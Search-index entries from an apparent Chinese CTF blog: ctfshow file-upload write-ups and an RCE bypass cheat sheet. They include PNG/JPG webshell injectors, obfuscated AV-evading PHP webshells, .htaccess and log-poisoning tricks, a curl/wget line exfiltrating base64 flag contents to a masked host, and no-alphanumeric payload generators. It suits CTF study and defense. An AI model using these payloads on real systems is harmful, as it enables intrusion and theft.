","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:9","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web162bypass-竞争上传"},{"categories":["CTF","web"],"content":"\r[web164]PNG二次渲染PNG二次渲染 尝试上传图片，查看上传后的路径，存在文件包含 http://5b82c70e-ecd3-4ebb-9665-11ce8c1a5b74.challenge.ctf.show/download.php?image=32d3ca5e23f4ccf1e4c8660c40e75f33.png 这里用到一个工具： https://github.com/huntergregal/PNG-IDAT-Payload-Generator cmd命令： python generate.py -m php -p ma.php -o a.png 得到a.png可以上传 上传后再执行命令： get：\u00260=system post：1=tac flag.php 浏览器页面图片没有直接回显，下载图片也可以看到flag信息 另外还有php生成png二次渲染马的脚本，直接运行可生成png图片： \u003c?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y \u003c sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color); } imagepng($img,'./1.png'); ?\u003e ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:10","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web164png二次渲染"},{"categories":["CTF","web"],"content":"\r[web165]JPG二次渲染JPG二次渲染 相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图像数据的部分直接就隔离开了。 上传正常jpg图片后访问，抓包发到重放器中，发现图片经过二次渲染 与png图片二次渲染的区别在于，需要一张上传上去再下载下来的图片，然后跑脚本 php exp.php 1.jpg php脚本： \u003c?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php \u003cjpg_name.jpg\u003e In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs \"Something's wrong\". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = \"\u003c?=eval(\\$_POST[1]);?\u003e\"; if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) { die('php-gd is not installed'); } if(!isset($argv[1])) { die('php jpg_payload.php \u003cjpg_name.jpg\u003e'); } set_error_handler(\"custom_error_handler\"); for($pad = 0; $pad \u003c 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-\u003ereadShort() != 0xFFD8) { die('Incorrect SOI marker'); } while((!$dis-\u003eeof()) \u0026\u0026 ($dis-\u003ereadByte() == 0xFF)) { $marker = $dis-\u003ereadByte(); $size = $dis-\u003ereadShort() - 2; $dis-\u003eskip($size); if($marker === 0xDA) { $startPos = $dis-\u003eseek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\"\\0\",$nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_'.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-\u003eeof())) { if($dis-\u003ereadByte() === 0xFF) { if($dis-\u003ereadByte !== 0x00) { break; } } } $stopPos = $dis-\u003eseek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\"\\0\",$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage('payload_'.$argv[1], $outStream)) { die('Success!'); } else { break; } } } } unlink('payload_'.$argv[1]); die('Something\\'s wrong'); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-\u003ebinData = ''; $this-\u003eorder = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die('File not exists ['.$filename.']'); $this-\u003ebinData = file_get_contents($filename); } else { $this-\u003ebinData = $filename; } $this-\u003esize = strlen($this-\u003ebinData); } public function seek() { return ($this-\u003esize - strlen($this-\u003ebinData)); } public function skip($skip) { $this-\u003ebinData = substr($this-\u003ebinData, $skip); } public function readByte() { if($this-\u003eeof()) { die('End Of File'); } $byte = substr($this-\u003ebinData, 0, 1); $this-\u003ebinData = substr($this-\u003ebinData, 1); return ord($byte); } public function readShort() { if(strlen($this-\u003ebinData) \u003c 2)","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:11","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web165jpg二次渲染"},{"categories":["CTF","web"],"content":"\r[web166]zip只能上传zip，那我们就上传一个一句话的zip文件，然后用蚁剑连接 新建一个zip文件，后面插入一句话木马 \u003c?php eval(@$_POST['a']); ?\u003e 需要注意的是Content-Type为application/x-zip-compressed 可以用蚁剑直接连接http://28bac684-221f-4841-8c98-b81c4f551965.challenge.ctf.show:8080/upload/download.php?file=de9373c30bd8d73705a6d44209947715.zip ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:12","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web166zip"},{"categories":["CTF","web"],"content":"\r[web167].htaccess根据提示上传了包含shell的jpg文件,上传成功,点击下载文件,发现没有存在文件包含点,访问upload检查是否有可执行文件,提示没有权限,但是发现中间件是Apache .htaccess文件中写入 AddType application/x-httpd-php .jpg \u003c!-将jpg文件按照php文件解析--\u003e 或者写入 Sethandler application/x-httpd-php \u003c!-将该目录及子目录下的文件均按照php文件解析执行--\u003e 通过改包文件后缀名的方式上传.htaccess 随后上传带有一句话木马的jpg文件 hackbar命令执行或者蚁剑连接 ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:13","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web167htaccess"},{"categories":["CTF","web"],"content":"\r[web168]免杀马png改包为php，但需要免杀马 \u003c?php $bFIY=create_function(chr(25380/705).chr(92115/801).base64_decode('bw==').base64_decode('bQ==').base64_decode('ZQ=='),chr(0x16964/0x394).chr(0x6f16/0xf1).base64_decode('YQ==').base64_decode('bA==').chr(060340/01154).chr(01041-0775).base64_decode('cw==').str_rot13('b').chr(01504-01327).base64_decode('ZQ==').chr(057176/01116).chr(0xe3b4/0x3dc));$bFIY(base64_decode('NjgxO'.'Tc7QG'.'V2QWw'.'oJF9Q'.''.str_rot13('G').str_rot13('1').str_rot13('A').base64_decode('VQ==').str_rot13('J').''.''.chr(0x304-0x2d3).base64_decode('Ug==').chr(13197/249).str_rot13('F').base64_decode('MQ==').''.'B1bnR'.'VXSk7'.'MjA0N'.'TkxOw'.'=='.''));?\u003e 蚁剑连接*****/upload/1.php 密码TyKPuntU 还有其他的免杀马： \u003c?php $a = \"s#y#s#t#e#m\"; $b = explode(\"#\",$a); $c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5]; $c($_REQUEST[1]); ?\u003e 再如： \u003c?php $a=$_REQUEST['a']; $b=$_REQUEST['b']; $a($b); ?\u003e 再如： \u003c?php $a=substr('1s',1).'ystem'; $a($_REQUEST[1]); ?\u003e ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:14","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web168免杀马"},{"categories":["CTF","web"],"content":"\r[web169]日志包含过滤了\u003c，无法执行PHP代码，于是考虑日志包含 前端限制必须上传zip，且file_content需修改为image/png 同时在user-agent中写入一句话木马，\u003c?php eval（$_POST['cmd']);?\u003e 随后上传一个.user.ini文件，auto_prepend_file=/var/log/nginx/access.log 再上传一个1.php文件，内容随便写，因为url/upload/目录下没有文件，所以需要写一个文件来承接.user.ini 接着就可以访问/url/upload/1.php，然后rce或者用蚁剑连接 ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:15","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web169日志包含"},{"categories":["CTF","web"],"content":"\r[web170]日志包含题解同上 点+空格+点绕过 某些情况下，源代码先是去除文件名前后的空格，再去除文件名最后所有的.，再通过strrchar函数来寻找.来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用1.php. .（点+空格+点）来绕过 ","date":"2023-11-17","objectID":"/ctfshow_file_upload/:2:16","series":null,"tags":["CTF","web"],"title":"ctfshow_file_upload","uri":"/ctfshow_file_upload/#web170日志包含"},{"categories":["CTF","web"],"content":"ctfshow命令/代码执行专题 ","date":"2023-11-17","objectID":"/ctfshow_rce/:0:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#"},{"categories":["CTF","web"],"content":"\r总结：","date":"2023-11-17","objectID":"/ctfshow_rce/:1:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#总结"},{"categories":["CTF","web"],"content":"\r文件读取可代替命令 more:一页一页的显示档案内容 less:与 more 类似 head:查看头几行 tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示 tail:查看尾几行 nl：显示的时候，顺便输出行号 od:以二进制的方式读取档案内容 vi:一种编辑器，这个也可以查看 vim:一种编辑器，这个也可以查看 sort:可以查看 uniq:可以查看 file -f:报错出具体内容 rev:逆序查看 以及： curl file:///flag strings /flag uniq -c/etc/passwd bash -v /etc/passwd rev /etc/passwd ","date":"2023-11-17","objectID":"/ctfshow_rce/:2:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#文件读取可代替命令"},{"categories":["CTF","web"],"content":"\r空格绕过 \u003c \u003c\u003e //重定向符 %20 //(space) %09 //(tab) $IFS$9 ${IFS} //最好用这个 $IFS {cat,flag.txt} //在大括号中逗号可起分隔作用 ","date":"2023-11-17","objectID":"/ctfshow_rce/:3:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#空格绕过"},{"categories":["CTF","web"],"content":"\r编码绕过Base64编码 [root@kali flag123]# echo 'cat' | base64 Y2F0Cg== [root@kali flag123]# `echo 'Y2F0Cg==' | base64 -d` flag flag{suifeng} ","date":"2023-11-17","objectID":"/ctfshow_rce/:4:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#编码绕过"},{"categories":["CTF","web"],"content":"\r进制绕过16进制 [root~]# echo cat flag.txt | xxd 6361 7420 666c 6167 2e74 7874 0a [root~]# echo 6361 7420 666c 6167 2e74 7874 0a | xxd -r -p cat flag.txt [root~]# echo 6361 7420 666c 6167 2e74 7874 0a | xxd -r -p | bash 或 | sh flag{flag_is_here} [root~]# $(printf \"\\x63\\x61\\x74\\x20\\x66\\x6c\\x61\\x67\\x2e\\x74\\x78\\x74\") //cat flag.txt 16进制 flag{flag_is_here} 8进制 [root~]# $(printf \"\\143\\141\\164\\40\\146\\154\\141\\147\\56\\164\\170\\164\") flag{flag_is_here} ","date":"2023-11-17","objectID":"/ctfshow_rce/:5:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#进制绕过"},{"categories":["CTF","web"],"content":"\r分隔符过滤绕过 ?\u003e || %0a ","date":"2023-11-17","objectID":"/ctfshow_rce/:6:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#分隔符过滤绕过"},{"categories":["CTF","web"],"content":"\r符号绕过正则单双引号 ca''t flag.txt ca\"\"t flag.txt 跨行符'\\' ca\\t flag.txt $* ca$*t flag.txt $@ ca$@t flag.txt $x或${x} ca$3t flag.txt ca${3}t flag.txt ","date":"2023-11-17","objectID":"/ctfshow_rce/:7:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#符号绕过正则"},{"categories":["CTF","web"],"content":"\r通配符绕过正则 shell通配符有： * ：表示通配字符0次及以上 ? : 表示通配字符0或 ","date":"2023-11-17","objectID":"/ctfshow_rce/:8:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#通配符绕过正则"},{"categories":["CTF","web"],"content":"\r可以通配得到的命令base64： /bin/base64 可以通配为： /???/????64 作用为将文件以base64编码形式输出 bzip2： /usr/bin/bzip2 可以通配为： /???/???/????2 作用为将文件压缩成后缀为bz2的压缩文件 flag.php ==\u003e flag.php.bz2 ","date":"2023-11-17","objectID":"/ctfshow_rce/:8:1","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#可以通配得到的命令"},{"categories":["CTF","web"],"content":"\r字符串通配 flag.php ==\u003e flag.??? flag* …… 还可以通配来匹配命令，但需要全路径 例如： /bin/ca? 相当于cat命令 ","date":"2023-11-17","objectID":"/ctfshow_rce/:8:2","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#字符串通配"},{"categories":["CTF","web"],"content":"\r变量拼接绕过正则 以flag.php为例: x=lag;cat f$x.php 相当于: cat flag.php ","date":"2023-11-17","objectID":"/ctfshow_rce/:9:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#变量拼接绕过正则"},{"categories":["CTF","web"],"content":"\r输入字符串长度限制 [root@kali flag123]# cat flag flag{suifeng} [root@kali flag123]# touch \"ag\" [root@kali flag123]# touch \"fl\\\\\" [root@kali flag123]# touch \"t \\\\\" [root@kali flag123]# touch \"ca\\\\\" [root@kali flag123]# s -t ca\\ t \\ fl\\ ag shell flag [root@kali flag123]# ls -t \u003eshell [root@kali flag123]# sh shell shell: line 1: shell: command not found flag{suifeng} shell: line 6: flag: command not found [root@kali flag123]# ls ag ca\\ fl flag shell t \\ # \\指的是换行 # ls -t是将文本按时间排序输出 # ls -t \u003eshell 将输出输入到shell文件中 # sh将文本中的文字读取出来执行 ","date":"2023-11-17","objectID":"/ctfshow_rce/:10:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#输入字符串长度限制"},{"categories":["CTF","web"],"content":"\r内联执行内联执行就是在一条shell语句中内嵌子shell语句,用主shell语句处理子语句的结果 可用于内联语句的符号 ${},``（反引号） echo `ls` echo ${ls} 相当于把ls的结果使用echo输出 ","date":"2023-11-17","objectID":"/ctfshow_rce/:11:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#内联执行"},{"categories":["CTF","web"],"content":"\r“${}”截取环境变量拼接 [root@kali ~]# echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin [root@kali ~]# echo ${PATH:5:1}${PATH:2:1} ls ${PATH:14:1}${PATH:5:1} flag.txt 在此环境中相当于 nl flag.txt ","date":"2023-11-17","objectID":"/ctfshow_rce/:12:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#截取环境变量拼接"},{"categories":["CTF","web"],"content":"\r[]中括号匹配绕过 /a-c][h-j][m-o/b-da[s-u] flag.txt 相当于 /bin/cat flag.txt 因为[]匹配范围只在当前路径 所以要为bin绝对路径 ","date":"2023-11-17","objectID":"/ctfshow_rce/:13:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#中括号匹配绕过"},{"categories":["CTF","web"],"content":"\rsource命令：source命令，又称点命令,可以用点号( . ),代替 该命令可以读取并执行文件中的命令 可构建文件上传表单，上传命令文件执行 表单： \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003ePOST数据包POC\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cform action=\"http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/\" method=\"post\" enctype=\"multipart/form-data\"\u003e \u003c!--链接是当前打开的题目链接--\u003e \u003clabel for=\"file\"\u003e文件名：\u003c/label\u003e \u003cinput type=\"file\" name=\"file\" id=\"file\"\u003e\u003cbr\u003e \u003cinput type=\"submit\" name=\"submit\" value=\"提交\"\u003e \u003c/form\u003e \u003c/body\u003e \u003c/html\u003e get请求为： ?c=.+/???/????????[@-[] 一般来说这个文件在linux下面保存在/tmp/php??????一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配） ","date":"2023-11-17","objectID":"/ctfshow_rce/:14:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#source命令"},{"categories":["CTF","web"],"content":"\r嵌套eval函数绕过 ?c=eval($_GET[a]);\u0026a=system('cat flag.php'); payload共传递了两个参数，第一个为嵌套eval第二个为向嵌套的eval传入参数 ","date":"2023-11-17","objectID":"/ctfshow_rce/:15:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#嵌套eval函数绕过"},{"categories":["CTF","web"],"content":"\r已知的其他函数拼凑所需字符串 ?c=show_source(next(array_reverse(scandir(pos(localeconv()))))); localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回数组第一个\".\" pos():输出数组第一个元素，不改变指针； scandir();遍历目录，这里因为参数为\".\"所以遍历当前目录 array_reverse():元组倒置 next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以 show_source():查看源码 使用pos(localeconv)来获取小数点 ","date":"2023-11-17","objectID":"/ctfshow_rce/:16:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#已知的其他函数拼凑所需字符串"},{"categories":["CTF","web"],"content":"\r无回显rce无回显的执行函数： exec() shell_exec() ``（反引号） 这些需要php函数echo才可以输出结果 ","date":"2023-11-17","objectID":"/ctfshow_rce/:17:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#无回显rce"},{"categories":["CTF","web"],"content":"\r复制到可访问文件 先将根目录复制到某个文件，然后访问查看 ls /| tee ls.txt 然后输入 url/1.txt 即可查看根目录 再复制flag文件，然后访问查看 cat /flag.php | tee flag.txt 然后输入 url/falg.txt 即可查看根目录 还可以使用其他的复制方法 copy /flag.php flag.txt mv /flag.php flag.txt ","date":"2023-11-17","objectID":"/ctfshow_rce/:17:1","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#复制到可访问文件"},{"categories":["CTF","web"],"content":"\rdnslog外带数据需要dnslog平台，可自己搭建 在自己的公网ip的网站目录下建立一个record.php的文件，里面写下如下代码 \u003c?php $data =$_GET['data']; $f = fopen(\"flag.txt\", \"w\"); fwrite($f,$data); fclose($f); ?\u003e 然后构造请求 curl http://*.*.*.**/record.php?data=`catflag|base64` wget http://*.*.*.*/record.php?data=`catflag|base64` 进行编码防止数据不全等问题 ","date":"2023-11-17","objectID":"/ctfshow_rce/:17:2","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#dnslog外带数据"},{"categories":["CTF","web"],"content":"\r\u003e/dev/null 2\u003e\u00261类无回显用分隔符进行分割即可绕过 ","date":"2023-11-17","objectID":"/ctfshow_rce/:17:3","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#devnull-21类无回显"},{"categories":["CTF","web"],"content":"\ruaf脚本绕过disable_function具体脚本看web72 ","date":"2023-11-17","objectID":"/ctfshow_rce/:18:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#uaf脚本绕过disable_function"},{"categories":["CTF","web"],"content":"\r无字母数字RCE","date":"2023-11-17","objectID":"/ctfshow_rce/:19:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#无字母数字rce"},{"categories":["CTF","web"],"content":"\r异或脚本生成包含所有可见字符的异或构造结果 \u003c?php $myfile = fopen(\"res.txt\", \"w\"); $contents=\"\"; for ($i=0; $i \u003c 256; $i++) { for ($j=0; $j \u003c256 ; $j++) { if($i\u003c16){ $hex_i='0'.dechex($i); } else{ $hex_i=dechex($i); } if($j\u003c16){ $hex_j='0'.dechex($j); } else{ $hex_j=dechex($j); } $preg = '/[a-z0-9]/i'; //根据题目给的正则表达式修改即可 if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){ echo \"\"; } else{ $a='%'.$hex_i; $b='%'.$hex_j; $c=(urldecode($a)^urldecode($b)); if (ord($c)\u003e=32\u0026ord($c)\u003c=126) { $contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\"; } } } } fwrite($myfile,$contents); fclose($myfile); 运行python脚本生成payload import requests import urllib from sys import * import os def action(arg): s1=\"\" s2=\"\" for i in arg: f=open(\"res.txt\",\"r\") while True: t=f.readline() if t==\"\": break if t[0]==i: #print(i) s1+=t[2:5] s2+=t[6:9] break f.close() output=\"(\\\"\"+s1+\"\\\"^\\\"\"+s2+\"\\\")\" return(output) while True: param=action(input(\"\\n[+] your function：\") )+action(input(\"[+] your command：\"))+\";\" print(param) 运行结果 (\"%08%02%08%08%05%0d\"^\"%7b%7b%7b%7c%60%60\")(\"%04%09%09\"^\"%60%60%7b\"); 低版本可能会导致执行不成功 ","date":"2023-11-17","objectID":"/ctfshow_rce/:19:1","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#异或"},{"categories":["CTF","web"],"content":"\r或 \u003c?php $myfile = fopen(\"res.txt\", \"w\"); $contents=\"\"; for ($i=0; $i \u003c 256; $i++) { for ($j=0; $j \u003c256 ; $j++) { if($i\u003c16){ $hex_i='0'.dechex($i); } else{ $hex_i=dechex($i); } if($j\u003c16){ $hex_j='0'.dechex($j); } else{ $hex_j=dechex($j); } $preg = '/[0-9a-z]/i';//根据题目给的正则表达式修改即可 if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){ echo \"\"; } else{ $a='%'.$hex_i; $b='%'.$hex_j; $c=(urldecode($a)|urldecode($b)); if (ord($c)\u003e=32\u0026ord($c)\u003c=126) { $contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\"; } } } } fwrite($myfile,$contents); fclose($myfile); python脚本： import requests import urllib from sys import * import os def action(arg): s1=\"\" s2=\"\" for i in arg: f=open(\"or_rce.txt\",\"r\") while True: t=f.readline() if t==\"\": break if t[0]==i: #print(i) s1+=t[2:5] s2+=t[6:9] break f.close() output=\"(\\\"\"+s1+\"\\\"|\\\"\"+s2+\"\\\")\" return(output) while True: param=action(input(\"\\n[+] your function：\") )+action(input(\"[+] your command：\"))+\";\" print(param) ","date":"2023-11-17","objectID":"/ctfshow_rce/:19:2","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#或"},{"categories":["CTF","web"],"content":"\r取反取反用的字符不会触发正则表达式，所以我们直接用php脚本生成payload即可 \u003c?php //在命令行中运行 fwrite(STDOUT,'[+]your function: '); $system=str_replace(array(\"\\r\\n\", \"\\r\", \"\\n\"), \"\", fgets(STDIN)); fwrite(STDOUT,'[+]your command: '); $command=str_replace(array(\"\\r\\n\", \"\\r\", \"\\n\"), \"\", fgets(STDIN)); echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');'; ?\u003e [root@kali html]# php test.php [+]your function: system [+]your command: dir [*] (~%8C%86%8C%8B%9A%92)(~%9B%96%8D)； ","date":"2023-11-17","objectID":"/ctfshow_rce/:19:3","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#取反"},{"categories":["CTF","web"],"content":"\rPHP封装协议?file=php://filter/read=convert.base64-encode/resource=config.php它可以读取对应文件源代码，得到的结果经过Base64解密后得到的是config.php源代码 ?file=php://input 写入PHP文件。它受限于allow_url_include选项。php://input可以读取没有处理过的POST数据 ?file=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=，d2VsY29tZSB0byB0aGUgempjdGY=是welcome to the zjctf。它和http://input一样都可以把一些内容写入其中。 file:///var/www/html/flag.php读取本地文件，路径要是相对路径。可用于读取web目录下的文件。 ","date":"2023-11-17","objectID":"/ctfshow_rce/:20:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#php封装协议"},{"categories":["CTF","web"],"content":"\r写入webshell确认寻找到的路径有写入权限之后，就可以开始写webshell了 ","date":"2023-11-17","objectID":"/ctfshow_rce/:21:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#写入webshell"},{"categories":["CTF","web"],"content":"\recho直接写入\rlinux echo '\u003c?php eval($_POST[2]); ?\u003e' \u003e 1.php 在Linux中，需要转义字符主要是 单引号 或者双引号 对于单引号，我们将其替换为\\47即可。 写的时候要注意题目的函数是命令执行还是代码执行 注意payload里的符号 蚁剑连接成功 windows set /p=要写的内容\u003cnul \u003e C:\\11.txt echo 要写的内容 \u003e C:\\11.txt 在windows中，批处理需要转义字符主要有 “\u0026”，“|”，“\u003c”，“\u003e”等等，转义字符为”^” 直接写入webshell一般不会成功，因为webshell中使用的某些关键符号可能被转码或屏蔽 ","date":"2023-11-17","objectID":"/ctfshow_rce/:21:1","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#echo直接写入"},{"categories":["CTF","web"],"content":"\recho直接写入\rlinux echo '\u003c?php eval($_POST[2]); ?\u003e' \u003e 1.php 在Linux中，需要转义字符主要是 单引号 或者双引号 对于单引号，我们将其替换为\\47即可。 写的时候要注意题目的函数是命令执行还是代码执行 注意payload里的符号 蚁剑连接成功 windows set /p=要写的内容 C:\\11.txt echo 要写的内容 \u003e C:\\11.txt 在windows中，批处理需要转义字符主要有 “\u0026”，“|”，“\u003c”，“\u003e”等等，转义字符为”^” 直接写入webshell一般不会成功，因为webshell中使用的某些关键符号可能被转码或屏蔽 ","date":"2023-11-17","objectID":"/ctfshow_rce/:21:1","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#linux"},{"categories":["CTF","web"],"content":"\recho直接写入\rlinux echo '\u003c?php eval($_POST[2]); ?\u003e' \u003e 1.php 在Linux中，需要转义字符主要是 单引号 或者双引号 对于单引号，我们将其替换为\\47即可。 写的时候要注意题目的函数是命令执行还是代码执行 注意payload里的符号 蚁剑连接成功 windows set /p=要写的内容 C:\\11.txt echo 要写的内容 \u003e C:\\11.txt 在windows中，批处理需要转义字符主要有 “\u0026”，“|”，“\u003c”，“\u003e”等等，转义字符为”^” 直接写入webshell一般不会成功，因为webshell中使用的某些关键符号可能被转码或屏蔽 ","date":"2023-11-17","objectID":"/ctfshow_rce/:21:1","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#windows"},{"categories":["CTF","web"],"content":"\r转换编码写入\rLinuxbase64方式写入： echo \"PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==\" | base64 -d \u003e2.php hex方式写入： hex写入与base64写入相似，在 https://www.107000.com/T-Hex/将webshell编码成hex，使用xxd命令还原 或在使用前将webshell使用xxd生成hex数据 echo '\u003c?php eval($_POST[1]); ?\u003e' |xxd -ps 然后命令注入执行 echo 3C3F706870206576616C28245F504F53545B315D293B203F3E|xxd -r -ps \u003e 3.php windows在windows中转换方法，是通过certutil进行转换。下面是base64以及hex的转换方式 certutil-Base64 echo 